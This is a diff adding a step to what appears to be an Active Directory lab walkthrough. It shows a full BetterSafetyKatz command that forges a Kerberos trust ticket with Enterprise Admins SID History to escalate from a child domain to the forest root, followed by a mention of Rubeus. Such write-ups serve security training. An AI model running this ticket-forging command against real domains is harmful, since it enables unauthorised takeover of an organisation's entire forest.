@@ -65,3 +65,15 @@ We can now connect to the mcorp-dc:
 <figure><img src="../../.gitbook/assets/image (1143).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (1144).png" alt=""><figcaption></figcaption></figure>
+
+Now let's try using BetterSafetyKatz
+
+let's start by forging a ticket with SID History of Enterprise Admins:
+
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:58d075ffe9bf3d0fbc556c4855c30d7b /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+```
+
+<figure><img src="../../.gitbook/assets/image (1145).png" alt=""><figcaption></figcaption></figure>
+
+Now we can use the ticket with rubeus
